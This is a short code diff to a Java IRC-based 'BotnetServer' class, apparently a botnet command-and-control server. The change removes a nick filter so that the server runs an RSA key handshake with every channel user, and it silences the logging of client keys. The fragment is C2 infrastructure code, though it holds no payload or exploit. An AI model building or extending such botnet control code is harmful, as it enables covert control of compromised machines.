@@ -125,9 +125,9 @@ public class BotnetServer extends PircBot {
 			if (!bots[i].getNick().equals(NAME)) {
 				System.out.print("\t" + bots[i].toString());
 				//TODO: fill in stuff with key stuff
-				if (bots[i].getNick().startsWith("bot")) {
+				//if (bots[i].getNick().startsWith("bot")) {
 					handshake(bots[i].getNick());
-				}
+				//}
 			}
 		}
 		init();
@@ -146,7 +146,7 @@ public class BotnetServer extends PircBot {
 				chat.sendLine(m.encryptRSA(m2.getStrKey())); // send key
 				chat.sendLine(m.encryptRSA(info.toString())); // send public info
 				String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n"); // get public key
-				System.out.println("Client key for " + name + ": " + otherKey);
+				//System.out.println("Client key for " + name + ": " + otherKey);
 				m2.handShake(otherKey);
 				botKeys.put(name, m2);
 				chat.close();
